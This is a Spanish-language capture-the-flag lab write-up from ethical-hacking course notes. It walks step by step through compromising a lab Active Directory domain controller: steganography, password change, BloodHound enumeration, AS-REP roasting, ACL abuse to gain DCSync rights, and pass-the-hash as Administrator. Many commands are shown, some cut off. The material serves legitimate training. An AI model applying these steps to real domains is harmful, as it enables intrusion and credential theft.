---
title: "🖥️ Máquina: BIG — Hacking Ético"
aliases:
  - BIG
  - big
  - Máquina BIG
  - VM BIG
  - Writeup BIG
tags:
  - ifct0109
  - hacking-etico
  - vms
  - active-directory
  - windows
  - ctf
---

# 🖥️ Máquina: BIG

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Windows Server 2022 — Active Directory  
> **Categoría:** Active Directory  
> **Técnicas trabajadas:** Esteganografía (steghide + MD5) · feroxbuster · impacket-changepasswd · netexec · evil-winrm · BloodHound / SharpHound · AS-REP Roasting · DCSync (PowerView + ACL abuse) · Pass-the-Hash  
> **Descripción:** En esta práctica atacaremos un Windows Server 2022 con Active Directory. Descubriremos credenciales ocultas mediante esteganografía en imágenes de la web usando MD5 como contraseña de extracción, cambiaremos contraseñas expiradas para obtener acceso, analizaremos el dominio con BloodHound para identificar una cadena de permisos y finalmente aplicaremos AS-REP Roasting sobre adm_puffy seguido de un abuso de ACLs para ejecutar DCSync y comprometer la cuenta Administrador.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `192.168.212.10`
* **`RHOST` (Víctima / BIG):** Ej. `192.168.212.4`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina BIG tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos escaneando puertos:

```bash
sudo nmap -sT -p- 192.168.212.4
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

> [!info] Resultado
> Perfil típico de Domain Controller: Kerberos (88), LDAP (389/636), SMB (445), DNS (53), WinRM (5985/47001), Global Catalog (3268/3269). Destaca también el puerto 80 con contenido web que investigaremos a continuación.

---

## 🌐 Fase 2: Enumeración web y esteganografía

Revisamos la web. En la web posible usuario juicy:

```bash
curl http://192.168.212.4
```

```text
/* It was all a dream */
    <h1>Juicy</h1>
    <p>I keep it juicy juicy, I eat that lunch (Yeah)</p>
```

> [!info] Resultado
> El comentario /* It was all a dream */ y el nombre Juicy son pistas. Vamos a usar feroxbuster para analizar la web ya que tiene mucho contenido y hay que ir entrando en diferentes niveles:

```bash
feroxbuster -u http://192.168.212.4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

> [!info] Resultado
> Vamos viendo el contenido de los diferentes directorios.
> · En /images hay 4 imágenes que descargamos:

```bash
for i in $(seq 1 4); do wget http://192.168.212.4/images/big$i.jpg; done
```

> [!info] Resultado
> · En /songs hay varios archivos txt con letras de canciones. Uno de ellos tiene un listado de contraseñas:
> http://192.168.212.4/songs/Skyisthelimit.txt. Lo descargamos:

```bash
wget http://192.168.212.4/songs/Skyisthelimit.txt
```

> [!info] Resultado
> · En /contents hay una nota con una pista muy importante: http://192.168.212.4/contents/notify.txt

```text
Who the hell did you hire to create the website!
Hiding keys in MD5 again!
I'm going to fire that guy
Puffy
```

> [!info] Resultado
> Dos pistas clave: las claves están ocultas usando MD5 como contraseña y hay un usuario llamado Puffy. Con steghide miramos en las imágenes si hay algo oculto, primero sin usar contraseñas:

```bash
steghide extract -sf big1.jpg
```

> [!info] Resultado
> No sale nada en ninguna imagen. Vamos con fuerza bruta a los archivos de imágenes usando el diccionario descargado:

```bash
stegcracker big1.jpg Skyisthelimit.txt
```

> [!info] Resultado
> Tampoco obtenemos nada. Seguimos las pistas de la web: el comentario en el código fuente era /* It was all a dream */ y la nota decía que las claves se ocultaban usando MD5. Calculamos el MD5 de esa frase exacta y lo probamos como contraseña de steghide. La idea es que el administrador usó el hash MD5 de esa frase como contraseña para ocultar el archivo:

```bash
echo -n 'It was all a dream' | md5sum | awk '{print $1}'
```

```text
99ae77c0c0faf78b872f9f452e3eaa24
```

Y ahora sí extraemos un txt del big2.jpg usando el MD5 como contraseña:

```bash
steghide extract -sf big2.jpg -p 99ae77c0c0faf78b872f9f452e3eaa24
```

```text
anotó los datos extraídos en "frase.txt".
```

```bash
cat frase.txt
```

```text
Bigpoppa1972
```

> [!info] Resultado
> Tenemos lo que parece una contraseña. Probamos con los posibles usuarios que tenemos: juicy y puffy.

---

## 🔑 Fase 3: Acceso inicial — usuario juicy

```bash
netexec smb 192.168.212.4 -u
```

```text
SMB  192.168.212.4  445  BIG  [-] bbr.thl\puffy:Bigpoppa1972 STATUS_LOGON_FAILURE
```

> [!info] Resultado
> Por aquí nada.

```bash
netexec smb 192.168.212.4 -u
```

```text
SMB  192.168.212.4  445  BIG  [-] bbr.thl\juicy:Bigpoppa1972 STATUS_PASSWORD_EXPIRED
```

> [!info] Resultado
> Este sí, aunque la clave ha expirado. Al conocer su clave actual podemos cambiarla con impacket-changepasswd:

```bash
impacket-changepasswd bbr.thl/juicy:Bigpoppa1972@192.168.212.4 -newpass
```

```text
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Changing the password of bbr.thl\juicy
[*] Connecting to DCE/RPC as bbr.thl\juicy
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

Y probamos con la nueva clave:

```bash
netexec smb 192.168.212.4 -u
```

```text
SMB  192.168.212.4  445  BIG  [+] bbr.thl\juicy:Bigpoppa.1974
```

> [!info] Resultado
> Tenemos acceso aunque no hay Pwn3d!. Las credenciales son válidas ([+]), pero el usuario no tiene privilegios de administrador local suficientes sobre SMB. Para que aparezca Pwn3d! en SMB necesitaríamos ser Administrador local del equipo o tener acceso al share ADMIN$ o C$. Aun así investigamos con SMB:

```bash
netexec smb 192.168.212.4 -u
```

```text
SMB  192.168.212.4  445  BIG  Share     Permissions  Remark
SMB  192.168.212.4  445  BIG  ADMIN$                 Remote Admin
SMB  192.168.212.4  445  BIG  C$                     Default share
SMB  192.168.212.4  445  BIG  IPC$      READ          Remote IPC
SMB  192.168.212.4  445  BIG  NETLOGON  READ          Logon server share
SMB  192.168.212.4  445  BIG  SYSVOL    READ          Logon server share
```

```bash
netexec smb 192.168.212.4 -u
```

```text
SMB  192.168.212.4  445  BIG  Administrator  2024-05-03 19:39:23  0
SMB  192.168.212.4  445  BIG  krbtgt         2024-05-03 20:02:57  0
SMB  192.168.212.4  445  BIG  Juicy          2026-03-26 23:36:11  0
SMB  192.168.212.4  445  BIG  adm_puffy      2026-03-26 23:10:23  0
```

> [!info] Resultado
> Revela que el nombre de usuario completo de puffy es adm_puffy.

```bash
netexec smb 192.168.212.4 -u
```

```text
SMB  192.168.212.4  445  BIG  [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB  192.168.212.4  445  BIG  [-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN
```

> [!info] Resultado
> juicy no tiene permisos suficientes para hacer DCSync. Comprobamos si tenemos acceso por WinRM:

```bash
netexec winrm 192.168.212.4 -u
```

```text
WINRM  192.168.212.4  5985  BIG  [+] bbr.thl\juicy:Bigpoppa.1974 (Pwn3d!)
```

> [!info] Resultado
> Tenemos Pwn3d! en WinRM. El usuario juicy pertenece al grupo Remote Management Users (o es administrador local), lo que le permite abrir sesiones WinRM y ejecutar comandos remotos.

---

## 🩸 Fase 4: Análisis del dominio con BloodHound / SharpHound

BloodHound es una herramienta que mapea las relaciones de confianza, permisos y rutas de escalada dentro de un Active Directory usando grafos. Visualiza cómo un atacante puede moverse de un usuario con pocos privilegios hasta el Domain Admin siguiendo cadenas de permisos que de otra forma serían difíciles de detectar manualmente. SharpHound es el recolector que se ejecuta en el sistema Windows para capturar esa información y generar un ZIP que luego se importa en BloodHound.

Comprobamos que conectamos con evil-winrm:

```bash
evil-winrm -i 192.168.212.4 -u
```

```bash
exit
```

Abrimos otro terminal de Kali dividiendo la pantalla en horizontal. Bajamos SharpHound:

```bash
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe
```

Conectamos nuevamente con evil-winrm, subimos SharpHound y lo ejecutamos:

```bash
evil-winrm -i 192.168.212.4 -u
```

```bash
upload /home/tecnico/big/SharpHound.exe
```

```bash
./SharpHound.exe
```

> [!info] Resultado
> Esperamos que termine, puede tardar un rato. Una vez termine descargamos el archivo zip resultante a Kali:

```bash
ls
```

```bash
download *.zip
```

```text
Info: Downloading C:\Users\Juicy\Documents\*.zip to Documents
Info: Download successful!
```

```bash
exit
```

De vuelta en Kali tendremos la carpeta Documents con el zip listo para importar en BloodHound:

```bash
ls -la
```

```text
drwxrwxr-x  3 tecnico tecnico    4096 mar 26 16:51 .
-rw-rw-r--  1 tecnico tecnico   53019 may  2  2024 big1.jpg
-rw-rw-r--  1 tecnico tecnico  192200 may  2  2024 big2.jpg
-rw-rw-r--  1 tecnico tecnico  221468 may  2  2024 big3.jpg
-rw-rw-r--  1 tecnico tecnico  196567 may  2  2024 big4.jpg
drwxrwxr-x  2 tecnico tecnico    4096 mar 26 16:50 Documents
-rw-rw-r--  1 tecnico tecnico      13 mar 26 16:34 frase.txt
-rw-rw-r--  1 tecnico tecnico 1046528 mar 26 16:44 SharpHound.exe
-rw-rw-r--  1 tecnico tecnico    1793 may  2  2024 Skyisthelimit.txt
```

```bash
🔵 Alternativa 2 — BloodHound.py desde Linux:
    https://github.com/dirkjanm/BloodHound.py
    https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce
    mkdir bloodhound && cd bloodhound
```

```bash
bloodhound-python -u
```

```bash
pywerview get-domainpolicy -d bbr.thl -u juicy -p
```

```bash
pywerview get-netuser -d bbr.thl -u juicy -p
```

```bash
pywerview get-netuser -d bbr.thl -u juicy -p
```

```bash
pywerview get-netuser -d bbr.thl -u juicy -p
```

```bash
pywerview get-netgroup -w bbr.thl/ -u juicy -p
```

```bash
pywerview get-netgroupmember -w bbr.thl/ -u juicy -p
```

```bash
pywerview get-netgroupmember -w bbr.thl/ -u juicy -p
```

```bash
pywerview get-netgroupmember -w bbr.thl/ -u juicy -p
```

```bash
🔵 Alternativa 4 — ldapdomaindump:
    mkdir addump && cd addump
```

```bash
ldapdomaindump -u
```

```bash
python3 -m http.server 80
```

---

## 🎯 Fase 5: Análisis de la cadena de privilegios — por qué atacamos adm_puffy

> [!info] Resultado
> En este punto se abrirá la práctica específica de BloodHound para analizar los datos recopilados. Tras ese análisis, identificamos la siguiente cadena de escalada que justifica ir contra el usuario adm_puffy:
> 1. adm_puffy es miembro del grupo Privilege Users.
> 2. El grupo Privilege Users es miembro del grupo Account Operators.
> 3. El grupo Account Operators tiene el permiso GenericAll sobre el grupo Special Permissions, lo que permite a adm_puffy añadirse a sí mismo como miembro de ese grupo.
> 4. El grupo Special Permissions tiene el permiso WriteACL sobre el dominio, lo que permite modificar las ACLs del dominio y otorgarse permisos de replicación.
> 5. Con los permisos Replicate Directory Changes y Replicate Directory Changes All podemos ejecutar un ataque DCSync y obtener los hashes de todos los usuarios del dominio, incluido el del Administrador.
> Además, adm_puffy tiene el atributo DONT_REQUIRE_PREAUTH activo, por lo que es vulnerable a AS-REP Roasting y podemos obtener su hash de contraseña sin necesidad de credenciales previas. Esta combinación — usuario vulnerable a AS-REP con una cadena de permisos que lleva hasta DCSync — es exactamente el tipo de ruta de escalada que BloodHound está diseñado para revelar.

---

## 🎫 Fase 6: AS-REP Roasting — adm_puffy

```bash
echo adm_puffy > users.txt
```

```bash
impacket-GetNPUsers bbr.thl/ -dc-ip 192.168.212.4 -usersfile users.txt
```

Lo guardamos en un archivo:

```bash
impacket-GetNPUsers bbr.thl/ -dc-ip 192.168.212.4 -usersfile users.txt | grep -v Impacket > adm_hash
```

Con john usando el diccionario que encontramos en la web:

```bash
john --wordlist=Skyisthelimit.txt adm_hash
```

> [!info] Resultado
> Las credenciales son adm_puffy:Demo@123. Entramos con evil-winrm:

---

## ⚡ Fase 7: Escalada de privilegios — DCSync via ACL abuse

```bash
evil-winrm -i 192.168.212.4 -u
```

Nos añadimos al grupo Special Permissions. Al pertenecer Account Operators al grupo con GenericAll sobre Special Permissions, adm_puffy puede modificar la membresía de ese grupo:

```bash
net group "Special Permissions" adm_puffy /add
```

```bash
exit
```

Salimos para descargar PowerView, que necesitamos para modificar las ACLs del dominio:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

Entramos nuevamente con evil-winrm, subimos PowerView y ejecutamos las líneas para darnos permisos DCSync. Add-DomainObjectAcl de PowerView añade entradas ACL sobre objetos del dominio, otorgando al grupo Special Permissions los derechos de replicación sobre el dominio:

```bash
evil-winrm -i 192.168.212.4 -u
```

```bash
upload PowerView.ps1
```

```bash
import-module .\powerview.ps1
```

```bash
$SecPassword = ConvertTo-SecureString 'Demo@123' -AsPlainText -Force
```

```bash
$Cred = New-Object System.Management.Automation.PSCredential('bbr.thl\adm_puffy', $SecPassword)
```

```bash
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'Special permissions' -TargetIdentity "bbr.thl\Special permissions" -Rights DCSync
```

Y con esto ya podemos salir y desde Kali extraer los hashes de todos los usuarios del dominio:

```bash
exit
```

```bash
netexec smb 192.168.212.4 -u
```

Y conectar con el hash del Administrador:

```bash
evil-winrm -i bbr.thl -u 'Administrator' -H 'bb1c50a48c37e053d2045cd5b55cd2f2'
```

Y leemos la bandera de root:

```bash
type root.txt
```

```text
8e824f6e933f0b62616aa54d75416184
```

La del usuario la pudimos leer al entrar como juicy:

```bash
type C:\Users\Juicy\Documents\user.txt
```

```text
53bdf70c03ad626fe7a17ba5a9495b3a
```

> [!info] Resultado
> Flag de usuario: 53bdf70c03ad626fe7a17ba5a9495b3a
> Flag de root: 8e824f6e933f0b62616aa54d75416184

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
